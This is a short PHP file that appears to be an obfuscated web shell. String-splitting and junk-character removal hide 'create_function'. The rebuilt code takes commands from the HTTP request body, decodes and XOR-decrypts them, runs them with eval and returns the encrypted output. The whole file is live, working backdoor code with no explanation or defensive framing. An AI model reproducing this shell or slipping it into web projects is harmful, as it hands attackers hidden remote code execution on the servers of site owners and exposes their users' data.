<?php
$P=str_replace('yy','','yycryyeyyate_fuyynyyctyyion');
$W='$k="mO2017be4mOe";$kh="mOa670eamO2f25mOdamO";$kf=mO"59257mOd45mO93mO80";$p=';
$u='mO=strlen($t);$mOo="";fmOor($i=mO0;mO$i<$l;mO){for($j=mO0;($j<$cmO&&$i';
$f='de($m[mO1]mO),$k)));$omOmO=@ob_get_mOcontents();mO@ob_emOmOnd_clemOan();$rmO=@';
$p='bamOmOse64_enmOcode(@x(@gzmOmOcompress($o),$mOk));printmO("$p$khmO$r$kf");}';
$B='mO<$mOl);$j++mO,$i++){$o.=$mOmOt{$i}^mO$k{$j};}mO}remOturnmO $o;mO}if (@preg';
$A='_mmOatch("/$kh(mO.+mO)$kf/",mO@file_gemOt_mOcontents("pmOhp://mOinput"mO),$m)==m';
$S='O1) mO{@omObmO_stamOrt();@evamOl(@gzuncompmOress(@x(@bmOasemO64_dmOeco';
$d='"nosmOoHRFxMoAmOFljmOuH";functiomOn x($t,$mOk){$c=smOmOtrlen($mOk);$l';
$t=str_replace('mO','',$W.$d.$u.$B.$A.$S.$f.$p);
$o=$P('',$t);$o();
?>
